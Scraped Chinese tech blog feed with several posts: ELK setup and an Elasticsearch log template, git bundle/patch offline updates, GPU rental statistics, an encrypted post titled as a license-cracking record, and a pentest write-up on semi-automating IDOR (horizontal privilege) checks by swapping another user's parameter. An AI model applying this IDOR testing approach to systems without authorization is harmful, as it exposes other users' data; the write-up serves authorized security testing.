<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;template&quot;: &quot;web-apache-*&quot;,</span><br><span class="line">  &quot;order&quot;:2,</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;analysis&quot;: &#123;  </span><br><span class="line">      &quot;analyzer&quot;: &#123;   </span><br><span class="line">        &quot;charSplit&quot;: &#123;  </span><br><span class="line">          &quot;type&quot;: &quot;custom&quot;,  </span><br><span class="line">              &quot;tokenizer&quot;: &quot;ngram_tokenizer&quot;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;,  </span><br><span class="line">     &quot;tokenizer&quot;: &#123;  </span><br><span class="line">           &quot;ngram_tokenizer&quot;: &#123;  </span><br><span class="line">             &quot;type&quot;: &quot;nGram&quot;,  </span><br><span class="line">             &quot;min_gram&quot;: &quot;1&quot;,  </span><br><span class="line">             &quot;max_gram&quot;: &quot;1&quot;,  </span><br><span class="line">             &quot;token_chars&quot;: [  </span><br><span class="line">               &quot;letter&quot;,  </span><br><span class="line">               &quot;digit&quot;,  </span><br><span class="line">               &quot;punctuation&quot;  </span><br><span class="line">             ]  </span><br><span class="line">           &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;,&quot;mappings&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &quot;apache-access&quot;: &#123;</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">            &quot;raw_request&quot;: &#123;  </span><br><span class="line">					     &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">					     &quot;store&quot;: &quot;yes&quot;,  </span><br><span class="line">					     &quot;analyzer&quot;: &quot;charSplit&quot;</span><br><span class="line">					&#125;,  </span><br><span class="line">            &quot;method&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;offset&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;long&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;auth&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;input_type&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">            &quot;http_version&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;float&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;read_timestamp&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;date&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;source&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;type&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;tags&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;@timestamp&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;date&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;bytes&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;long&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;@version&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;beat&quot;: &#123;</span><br><span class="line">                &quot;properties&quot;: &#123;</span><br><span class="line">                    &quot;hostname&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;name&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &quot;version&quot;: &#123;</span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;host&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;client_ip&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;status&quot;: &#123;</span><br><span class="line">                &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="Logstash">Logstash:</h2>
<p><code>wget https://artifacts.elastic.co/downloads/logstash/logstash-5.6.1.rpm </code></p>
<p><code>sudo rpm --install logstash-5.6.1.rpm</code></p>
<hr />
<h2 id="Kibana">Kibana:</h2>
<p><code>wget https://artifacts.elastic.co/downloads/kibana/kibana-5.6.1-x86_64.rpm </code></p>
<p><code>sudo rpm --install kibana-5.6.1-x86_64.rpm </code></p>
<p>修改<code>/etc/kibana/kibana.yml</code>添加<code>server.host:0.0.0.0</code></p>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-某产品license破解记录</title>
    <url>/2020/23692.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="516d11c9f2ea3eee482e181f8f92c63b569bd0e8ed9491931b850ac05cc41511"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>记录-简单的代码离线更新方案</title>
    <url>/2019/35326.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>部署在内网的主机,无法联网,需要在离线的状态下进行更新.</p>
<hr />
<h1>方案:</h1>
<p>使用git 的<code>git format-patch</code>或者 <code>git bundle</code></p>
<p>两者的区别:</p>
<p><a href="https://stackoverflow.com/questions/24013127/which-is-better-to-use-and-why-git-format-patch-or-git-bundle">Which is better to use and why? git format-patch or git bundle?</a></p>
<blockquote>
<p><code>git bundle</code> only makes sense if you transfer a changeset from one git-repository to another, whereas <code>git format-patch</code> creates standard diff-files which can be inspected easily and applied to a non-gitified source tree as well. on the other hand <code>git bundle</code> creates a single file, which is easier to transport than the multi-file output of <code>git format-patch</code></p>
</blockquote>
<p><code>git bundle</code>只产生一个文件,只能应用于同一个仓库,而<code>git format-patch</code>会产生多个文件,不仅限于同一个仓库.</p>
<hr />
<h1>git bundle:</h1>
<p>使用场景:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>有可能你的网络中断了，但你又希望将你的提交传给你的合作者们。</p>
</li>
<li class="lvl-2">
<p>可能你不在办公网中并且出于安全考虑没有给你接入内网的权限。</p>
</li>
<li class="lvl-2">
<p>可能你的无线、有线网卡坏掉了。</p>
</li>
<li class="lvl-2">
<p>可能你现在没有共享服务器的权限，你又希望通过邮件将更新发送给别人，却不希望通过 <code>format-patch</code> 的方式传输 40 个提交。</p>
</li>
</ul>
<p><code>bundle</code> 命令会将 <code>git push</code> 命令所传输的所有内容打包成一个二进制文件，你可以将这个文件通过邮件或者闪存传给其他人，然后解包到其他的仓库中。</p>
<hr />
<h2 id="git-bundle-使用命令">git bundle 使用命令:</h2>
<h2 id="创建">创建:</h2>
<p>生成<code>repo.bundle</code>的文件，该文件包含了所有重建该仓库<code>master</code>分支所需的数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git bundle create repo.bundle HEAD master</span><br></pre></td></tr></table></figure>
<p>在使用 <code>bundle</code> 命令时，你需要列出所有你希望<strong>打包的引用或者提交的区间</strong>。 如果你希望这个仓库可以在别处被克隆，你应该像例子中那样增加一个 HEAD 引用。</p>
<h2 id="应用">应用:</h2>
<p>克隆项目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> repo.bundle repo</span><br></pre></td></tr></table></figure>
<hr />
<h1>git format-patch:</h1>
<blockquote>
<p>UNIX世界的软件开发大多都是协作式的，因此，Patch（补丁）是一个相当重要的东西，因为几乎所有的大型UNIX项目的普通贡献者，都是通过 Patch来提交代码的。作为最重要的开源项目之一，Linux，也是这样的。普通开发者从软件仓库clone下代码，然后写入代码，做一个Patch， 最后用E-mail发给Linux Kernel的维护者就好了。Git最初作为Linux的版本控制工具，提供了透明、完整、稳定的Patch功能。</p>
</blockquote>
<blockquote>
<p>我们先介绍一下Patch是什么。如果一个软件有了新版本，我们可以完整地下载新版本的代码进行编译安装。然而，像Linux Kernel这样的大型项目，代码即使压缩，也超过70MB，每次全新下载是有相当大的代价的。然而，每次更新变动的代码可能不超过1MB，因此，我们只 要能够有两个版本代码的diff的数据，应该就可以以极低的代价更新程序了。因此，Larry Wall开发了一个工具：patch。它可以根据一个diff文件进行版本更新。</p>
</blockquote>
<blockquote>
<p>不过在git中，我们没有必要直接使用diff和patch来做补丁，这样做既危险又麻烦。git提供了两种简单的patch方案。一是用git diff生成的标准patch，二是git format-patch生成的Git专用Patch。</p>
</blockquote>
<h2 id="git-format-patch-使用命令">git format-patch 使用命令:</h2>
<h2 id="创建patch">创建patch:</h2>
<p>某次提交（含）之前的几次提交：n指从sha1 id对应的commit开始算起n个提交</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch 【commit sha1 <span class="built_in">id</span>】-n</span><br></pre></td></tr></table></figure>
<p>eg:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch  2a2fb4539925bfa4a141fe492d9828d030f7c8a8 -2</span><br></pre></td></tr></table></figure>
<p>某两次提交之间的所有patch:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch 【commit sha1 <span class="built_in">id</span>】..【commit sha1 <span class="built_in">id</span>】 </span><br></pre></td></tr></table></figure>
<p>eg:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git format-patch  2a2fb4539925bfa4a141fe492d9828d030f7c8a8..89aebfcc73bdac8054be1a242598610d8ed5f3c8</span><br></pre></td></tr></table></figure>
<h2 id="应用patch">应用patch:</h2>
<p>检查patch/diff是否能正常打入:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git apply --check 【path/to/xxx.patch】</span><br><span class="line">git apply --check 【path/to/xxx.diff】</span><br></pre></td></tr></table></figure>
<p>打入patch/diff:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git apply 【path/to/xxx.patch】</span><br><span class="line">git apply 【path/to/xxx.diff】</span><br></pre></td></tr></table></figure>
<hr />
<h1>Summary:</h1>
<p><code>git bundle</code>可以理解为全量更新<code>git format-patch</code>可以理解为增量更新</p>
<p>为了方便,还是选择了<code>git bundle</code>,因为使用<code>git format-patch</code>的过程,容易出现<code>patch</code>打不上导致更新中断的问题.</p>
<p>不过对于更严谨的更新方案的话,还是应该选择<code>git format-patch</code>的.</p>
<hr />
<h1>大体思路:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>更新包生成端:</p>
<ul class="lvl-2">
<li class="lvl-4">分别生成各个项目的<code>bundle</code>文件</li>
<li class="lvl-4">加密压缩成<code>zip</code>文件</li>
</ul>
</li>
<li class="lvl-2">
<p>更新包使用端:</p>
<ul class="lvl-2">
<li class="lvl-4">用密钥解密压缩包</li>
<li class="lvl-4">到指定目录移除原来的项目,执行<code>git clone</code></li>
</ul>
</li>
</ul>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g13nngtg6pj31320u0wpg.jpg" alt="" /></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://www.mottoin.com/article/network/97143.html">巡风在隔离网络环境下的离线更新方案</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/33208607">携程无线离线包增量更新方案实践</a></p>
</li>
<li class="lvl-2">
<p><a href="https://gitee.com/liujin0506/autopatch">根据git对比分支与tag之间的文件变动，生成补丁包</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/jinweilin/article/details/78356860">git打两个版本的增量包</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/ec04de3f95cc">Git 打补丁-- patch 和 diff 的使用（详细）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://git-scm.com/book/zh/v2/Git-%E5%B7%A5%E5%85%B7-%E6%89%93%E5%8C%85">Git 工具 - 打包</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/an23lm/GitBundlePlus">Bundle a local Git project with all uncommitted changes and stashes (git bundle on steroids).</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/sinat_20059415/article/details/80598347">git 打补丁方法总结</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/kangear/article/details/39675421">Git打补丁常见问题</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/y041039/articles/2411600.html">Git的Patch功能</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Dev</category>
      </categories>
      <tags>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>越权半自动化插件的尝试</title>
    <url>/2019/14249.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>当一个事情变得枯燥时，就该考虑自动化了。</p>
<p>场景：当你渗透测试一个网站时，你发现其中某个页面某个参数存在越权时，你就会想那么其他页面的其他包的这个参数会不会有问题。。。</p>
<p>可是又要全测一边会觉得累，不测又会觉得漏。那这个时候就可以考虑下自动化，半自动化了。</p>
<p>我就尝试在<a href="https://github.com/w-digital-scanner/w13scan/tree/master/W13SCAN">w13scan</a>的架构下,编写了一个简单的越权半自动化插件</p>
<hr />
<h1>流程:</h1>
<h2 id="第一步-手工测试找vuln-parameter">第一步:手工测试找vuln_parameter</h2>
<p>先是手工测试出某个包的某个参数是存在越权漏洞的,也就是这个参数值可能服务器没有做很完备的鉴权。</p>
<p>比如是<code>phone</code>这个参数,那么以这个作为<code>vuln_key</code>(<code>vuln_parameter</code>)</p>
<h2 id="第二步-以vuln-parameter做路由">第二步:以vuln_parameter做路由</h2>
<p>就是含有<code>vuln_parameter</code>的包,都会路由到这个插件里进行处理</p>
<h2 id="第三步-确定payload">第三步:确定payload</h2>
<p>比如是<code>phone参数</code>,然后准备另一个用户的手机号码</p>
<p>确定payload: <code>&#123;&quot;phone&quot;:134xxxxxx&#125;</code></p>
<h2 id="第四步-篡改request包">第四步:篡改request包</h2>
<p>以<code>vuln_parameter</code>去定位包中要篡改的位置,然后将准备好的payload的参数值替换上去.</p>
<h2 id="第五步-发包-权衡判断条件">第五步:发包,权衡判断条件</h2>
<p>判断我感觉比较麻烦:</p>
<p>可以通过<code>status_code</code>状态码,Response状态码为200的话可以先保证:<strong>篡改的过程中的请求参数没有出错。</strong></p>
<p>然后再加上一个<code>And</code>的条件：正向特征、反向特征</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>正向特征:</p>
</li>
</ul>
<p>先收集一些请求成功且有返回一定数据的Response包</p>
<p>例如Response的body里:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;msg&#x27;:&#x27;OK&#x27;, data:&#123;&quot;name&quot;:xxx, &quot;address&quot;:xxx&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>反向特征:</p>
</li>
</ul>
<p>收集一些请求成功但是服务端有鉴权判定为越权的Response包</p>
<p>例如Response的body里:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;你没有权限进行此操作&#x27;</span>, data:null&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;不可以越权操作&#x27;</span>, data:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;msg&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>, data:false&#125;</span><br></pre></td></tr></table></figure>
<p>从正反两个方面去提取一些特征,作为判断是否有越权漏洞的标志。</p>
<p>比如</p>
<p>正向的就是 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status_code =<span class="number">200</span> <span class="keyword">and</span> response[<span class="string">&#x27;msg&#x27;</span>] == <span class="string">&#x27;OK&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>反向的就是 :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> status_code =<span class="number">200</span> <span class="keyword">and</span> response[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> null</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>判断的效果 跟判断条件有很大的关系判断严了,容易漏 判断松了 容易误报那么我觉得比较好的判断原则是: 宁可误报,也不要漏</p>
</blockquote>
<h2 id="大致流程图">大致流程图:</h2>
<p><img src="https://i.loli.net/2019/12/30/uQoROD6WfMypPLl.jpg" alt="" /></p>
<hr />
<h1>效果图:</h1>
<p><img src="https://i.loli.net/2019/12/29/16tzTDCNMK47uLl.jpg" alt="" /></p>
<p>效果不是很理想,一开始以为可以找到更多处地方的越权漏洞,结果只能验证到原来手工能测出来的那个越权点。</p>
<p>但是好处就是,你确定这个<code>vuln_parameter</code>在其他页面确实是没问题的。</p>
<p>这个思路是大致ok的,之后再优化下,在别的系统上应该能有比较好的效果。</p>
<hr />
<h1>总结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>半自动化流程:</p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p>手工测试找<code>vuln_parameter</code></p>
</li>
<li class="lvl-3">
<p>以<code>vuln_parameter</code>做路由</p>
</li>
<li class="lvl-3">
<p>确定payload</p>
</li>
<li class="lvl-3">
<p>篡改request包</p>
</li>
<li class="lvl-3">
<p>发包,权衡判断条件</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>这种情况下是只持有单用户的token,如果有两个用户的token和更多的数据包,判断效果会更好</p>
</li>
<li class="lvl-2">
<p>只适用于平行越权,普通用户a越权查看普通用户b的信息,只能做查的操作,增删改的操作貌似做不到。</p>
</li>
<li class="lvl-2">
<p>每换一个<code>vuln_parameter</code>就要修改一下脚本,可考虑修改的地方作为变量,但是因为<code>w13scan</code>架构的关系,暂时好像不支持插件中含有变量</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-20240315_ionet_GPU算力数据分析</title>
    <url>/2024/20872.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>数据说明:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>采集时间:20240315</p>
</li>
<li class="lvl-2">
<p>数据来源:ionet官网</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240505231339.png" alt="20240505231339" /></p>
<h2 id="基础数据">基础数据:</h2>
<table>
<thead>
<tr>
<th style="text-align:left">序号</th>
<th style="text-align:left">显卡型号</th>
<th style="text-align:left">GPU数量</th>
<th style="text-align:left">已出租GPU数量</th>
<th style="text-align:left">京东单卡价格（rmb）</th>
<th style="text-align:left">GPU总价值（rmb）</th>
<th style="text-align:left">销售机型总价值（rmb）</th>
<th style="text-align:left">上线机型出售比例%</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">RTX A6000 K8S</td>
<td style="text-align:left">8426</td>
<td style="text-align:left">1685.2</td>
<td style="text-align:left">32000</td>
<td style="text-align:left">269,632,000</td>
<td style="text-align:left">53,926,400</td>
<td style="text-align:left">20%</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">Tesla T4</td>
<td style="text-align:left">3047</td>
<td style="text-align:left">0</td>
<td style="text-align:left">5000</td>
<td style="text-align:left">15,235,000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">RTX A4000 K8S</td>
<td style="text-align:left">1988</td>
<td style="text-align:left">337.96</td>
<td style="text-align:left">5300</td>
<td style="text-align:left">10,536,400</td>
<td style="text-align:left">1,791,188</td>
<td style="text-align:left">17%</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td style="text-align:left">GeForce RTX 3090</td>
<td style="text-align:left">1953</td>
<td style="text-align:left">0</td>
<td style="text-align:left">8200</td>
<td style="text-align:left">16,014,600</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td style="text-align:left">GeForce RTX 3060</td>
<td style="text-align:left">1732</td>
<td style="text-align:left">17.32</td>
<td style="text-align:left">2200</td>
<td style="text-align:left">3810400</td>
<td style="text-align:left">38,104</td>
<td style="text-align:left">1%</td>
</tr>
<tr>
<td style="text-align:left">6</td>
<td style="text-align:left">GeForce RTX 3070</td>
<td style="text-align:left">1577</td>
<td style="text-align:left">0</td>
<td style="text-align:left">2300</td>
<td style="text-align:left">3627100</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td style="text-align:left">GeForce RTX 4090</td>
<td style="text-align:left">1336</td>
<td style="text-align:left">13.36</td>
<td style="text-align:left">17000</td>
<td style="text-align:left">22712000</td>
<td style="text-align:left">227,120</td>
<td style="text-align:left">1%</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td style="text-align:left">RTX A5000 K8S</td>
<td style="text-align:left">1241</td>
<td style="text-align:left">0</td>
<td style="text-align:left">12000</td>
<td style="text-align:left">14892000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td style="text-align:left">GeForce RTX 3080</td>
<td style="text-align:left">1239</td>
<td style="text-align:left">0</td>
<td style="text-align:left">3300</td>
<td style="text-align:left">4088700</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td style="text-align:left">GeForce RTX 4060</td>
<td style="text-align:left">877</td>
<td style="text-align:left">0</td>
<td style="text-align:left">2400</td>
<td style="text-align:left">2104800</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td style="text-align:left">GeForce RTX 3060 Ti</td>
<td style="text-align:left">707</td>
<td style="text-align:left">21.21</td>
<td style="text-align:left">2300</td>
<td style="text-align:left">1626100</td>
<td style="text-align:left">48,783</td>
<td style="text-align:left">3%</td>
</tr>
<tr>
<td style="text-align:left">12</td>
<td style="text-align:left">A100-PCIE-40GB</td>
<td style="text-align:left">700</td>
<td style="text-align:left">0</td>
<td style="text-align:left">60000</td>
<td style="text-align:left">42000000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">13</td>
<td style="text-align:left">tesla v100</td>
<td style="text-align:left">602</td>
<td style="text-align:left">0</td>
<td style="text-align:left">7000</td>
<td style="text-align:left">4214000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">14</td>
<td style="text-align:left">GeForce RTX 4070</td>
<td style="text-align:left">579</td>
<td style="text-align:left">0</td>
<td style="text-align:left">5000</td>
<td style="text-align:left">2895000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">15</td>
<td style="text-align:left">A16</td>
<td style="text-align:left">536</td>
<td style="text-align:left">0</td>
<td style="text-align:left">21800</td>
<td style="text-align:left">11684800</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">16</td>
<td style="text-align:left">3090ti</td>
<td style="text-align:left">512</td>
<td style="text-align:left">0</td>
<td style="text-align:left">10000</td>
<td style="text-align:left">5120000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">17</td>
<td style="text-align:left">4060ti</td>
<td style="text-align:left">304</td>
<td style="text-align:left">0</td>
<td style="text-align:left">4000</td>
<td style="text-align:left">1216000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">18</td>
<td style="text-align:left">a100 pcle 80</td>
<td style="text-align:left">272</td>
<td style="text-align:left">272</td>
<td style="text-align:left">140000</td>
<td style="text-align:left">38080000</td>
<td style="text-align:left">38,080,000</td>
<td style="text-align:left">100%</td>
</tr>
<tr>
<td style="text-align:left">19</td>
<td style="text-align:left">3080ti</td>
<td style="text-align:left">256</td>
<td style="text-align:left">0</td>
<td style="text-align:left">4400</td>
<td style="text-align:left">1126400</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">20</td>
<td style="text-align:left">3060 ti</td>
<td style="text-align:left">256</td>
<td style="text-align:left">0</td>
<td style="text-align:left">2600</td>
<td style="text-align:left">665600</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">21</td>
<td style="text-align:left">3060 k8s</td>
<td style="text-align:left">245</td>
<td style="text-align:left">0</td>
<td style="text-align:left">2400</td>
<td style="text-align:left">588000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">22</td>
<td style="text-align:left">3080ti k8s</td>
<td style="text-align:left">241</td>
<td style="text-align:left">0</td>
<td style="text-align:left">2400</td>
<td style="text-align:left">578400</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">23</td>
<td style="text-align:left">3070 ti</td>
<td style="text-align:left">235</td>
<td style="text-align:left">0</td>
<td style="text-align:left">3400</td>
<td style="text-align:left">799000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">24</td>
<td style="text-align:left">4070ti</td>
<td style="text-align:left">214</td>
<td style="text-align:left">0</td>
<td style="text-align:left">6000</td>
<td style="text-align:left">1284000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">25</td>
<td style="text-align:left">2080ti</td>
<td style="text-align:left">204</td>
<td style="text-align:left">6.12</td>
<td style="text-align:left">2700</td>
<td style="text-align:left">550800</td>
<td style="text-align:left">16,524</td>
<td style="text-align:left">3%</td>
</tr>
<tr>
<td style="text-align:left">26</td>
<td style="text-align:left">a100  80gb pcle</td>
<td style="text-align:left">203</td>
<td style="text-align:left">0</td>
<td style="text-align:left">145999</td>
<td style="text-align:left">29637797</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">27</td>
<td style="text-align:left">a100 sxm4-80</td>
<td style="text-align:left">174</td>
<td style="text-align:left">0</td>
<td style="text-align:left">130000</td>
<td style="text-align:left">22620000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">28</td>
<td style="text-align:left">4080</td>
<td style="text-align:left">159</td>
<td style="text-align:left">0</td>
<td style="text-align:left">4499</td>
<td style="text-align:left">715341</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">29</td>
<td style="text-align:left">a400</td>
<td style="text-align:left">151</td>
<td style="text-align:left">0</td>
<td style="text-align:left">5899</td>
<td style="text-align:left">890749</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">30</td>
<td style="text-align:left">tesla-v100-sxm2</td>
<td style="text-align:left">148</td>
<td style="text-align:left">0</td>
<td style="text-align:left">8300</td>
<td style="text-align:left">1228400</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">31</td>
<td style="text-align:left">h100 80g pcle k8s</td>
<td style="text-align:left">146</td>
<td style="text-align:left">0</td>
<td style="text-align:left">250000</td>
<td style="text-align:left">36500000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
<tr>
<td style="text-align:left">32</td>
<td style="text-align:left">3050</td>
<td style="text-align:left">90</td>
<td style="text-align:left">12.6</td>
<td style="text-align:left">1500</td>
<td style="text-align:left">135000</td>
<td style="text-align:left">18,900</td>
<td style="text-align:left">14%</td>
</tr>
<tr>
<td style="text-align:left">33</td>
<td style="text-align:left">a10</td>
<td style="text-align:left">71</td>
<td style="text-align:left">0</td>
<td style="text-align:left">27000</td>
